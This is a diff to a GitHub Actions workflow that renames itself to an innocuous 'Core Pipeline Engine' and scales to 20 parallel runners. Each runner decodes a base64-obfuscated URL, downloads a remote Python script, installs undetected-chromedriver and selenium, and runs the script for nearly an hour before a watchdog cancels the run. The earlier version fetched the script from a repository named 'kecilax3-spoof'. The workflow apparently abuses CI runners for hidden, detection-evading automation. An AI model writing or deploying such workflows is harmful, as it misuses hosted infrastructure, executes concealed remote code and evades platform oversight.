@@ -1,10 +1,10 @@
-name: Iron Vanguard Runner
+name: Core Pipeline Engine
 
 on:
   workflow_dispatch:
 
 concurrency:
-  group: vanguard-${{ github.workflow }}-${{ github.ref }}
+  group: pipeline-core-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 permissions:
@@ -12,73 +12,81 @@ permissions:
   contents: read
 
 jobs:
-  sentry-daemon:
-    name: Sentry Daemon
+  # =================================================================
+  # Watchdog: Terminates execution safely after the elapsed time
+  # =================================================================
+  watchdog-timer:
+    name: "Watchdog Monitor"
     runs-on: ubuntu-latest
-    timeout-minutes: 65
+    timeout-minutes: 60
+    env:
+      MAX_DURATION: 3540
     steps:
-      - name: Initiate countdown fuse
-        env:
-          BEARER: ${{ secrets.GITHUB_TOKEN }}
-          REPO:   ${{ github.repository }}
-          RUN:    ${{ github.run_id }}
+      - name: Initialize Watchdog
         run: |
-          set -e
-          FUSE=3600
-          printf 'sentry-daemon online | fuse=%ss\n' "$FUSE"
-          sleep "$FUSE"
-          printf 'fuse tripped | broadcasting termination\n'
+          echo "[WATCHDOG] Tracking workflow instance ID: ${{ github.run_id }}"
+          echo "[WATCHDOG] Allocated runtime window: ${MAX_DURATION}s."
+
+          sleep "${MAX_DURATION}"
+
+          echo "[WATCHDOG] Time limit reached — initiating termination signal."
+
           curl -sS -X POST \
-            -H "Authorization: Bearer $BEARER" \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
             -H "Accept: application/vnd.github+json" \
             -H "X-GitHub-Api-Version: 2022-11-28" \
-            "https://api.github.com/repos/$REPO/actions/runs/$RUN/cancel"
-          printf 'termination broadcast complete\n'
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
 
-  unit-executor:
-    name: Unit-${{ matrix.tag }}
+          echo "[WATCHDOG] Termination request dispatched."
+
+  # =================================================================
+  # Worker Cluster: Distributed execution across multi-nodes
+  # =================================================================
+  worker-cluster:
+    name: "Node-${{ matrix.node_id }}"
     runs-on: ubuntu-latest
-    timeout-minutes: 62
+    timeout-minutes: 59
+
     strategy:
       fail-fast: false
       matrix:
-        tag: [u01, u02, u03, u04, u05, u06, u07, u08, u09]
-    env:
-      SEG_A: "https://raw.githubusercontent.com/"
-      SEG_B: "MyMushroom22/kecilax3-spoof/"
-      SEG_C: "master/start.py"
-      LIFESPAN: 3600
+        node_id: [alpha-01, beta-02, gamma-03, delta-04, omega-05, sigma-06, theta-07, zeta-08, kapa-09, lambda-10, x-11, y-12, z-13, v-14, w-15, u-16, t-17, s-18, r-19, q-20]
+
     steps:
-      - name: Provision runner environment
+      - name: Prepare System
         run: |
+          echo "[SETUP] Preparing node environment on Node-${{ matrix.node_id }}..."
           sudo apt-get update -qq
           sudo apt-get install -y curl python3-pip
-          printf 'runner ready for %s\n' "${{ matrix.tag }}"
 
-      - name: Retrieve worker script
+      - name: Fetch Payload
         run: |
-          TARGET="${SEG_A}${SEG_B}${SEG_C}"
-          printf 'pulling worker from upstream\n'
-          curl -fsSL "$TARGET" -o worker.py
-          printf 'worker downloaded (%s bytes)\n' "$(wc -c < worker.py)"
+          echo "[DOWNLOAD] Retrieving remote execution source..."
+          OBF_URL="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk="
+          DECODED_URL=$(echo "$OBF_URL" | base64 -d)
+          curl -sL "$DECODED_URL" -o worker_exec.py
+          echo "[DOWNLOAD] Source script successfully fetched."
 
-      - name: Install python packages
+      - name: Install Dependencies
         run: |
-          pip3 install --quiet --disable-pip-version-check \
-            undetected-chromedriver selenium requests
+          echo "[ENV] Installing required Python packages..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
 
-      - name: Launch and monitor worker
+      - name: Execute Main Task
         run: |
-          printf 'spawning worker for %s\n' "${{ matrix.tag }}"
-          python3 worker.py &
-          WPID=$!
-          printf 'monitoring window=%ss\n' "$LIFESPAN"
-          sleep "$LIFESPAN"
-          if kill -0 "$WPID" 2>/dev/null; then
-            printf 'window closed | signaling worker\n'
-            kill -15 "$WPID" || true
-            sleep 2
-            kill -9 "$WPID" 2>/dev/null || true
+          echo "[EXEC] Starting background task on node ${{ matrix.node_id }}..."
+
+          python3 worker_exec.py &
+          TASK_PID=$!
+
+          echo "[EXEC] Task spawned with PID: $TASK_PID. Duration window: 3540s."
+
+          sleep 3540
+
+          if ps -p "$TASK_PID" > /dev/null 2>&1; then
+            echo "[EXEC] Window elapsed — terminating background process."
+            kill -9 "$TASK_PID"
+            echo "[EXEC] Process successfully killed."
           else
-            printf 'worker finished early\n'
+            echo "[EXEC] Process finished execution naturally."
           fi
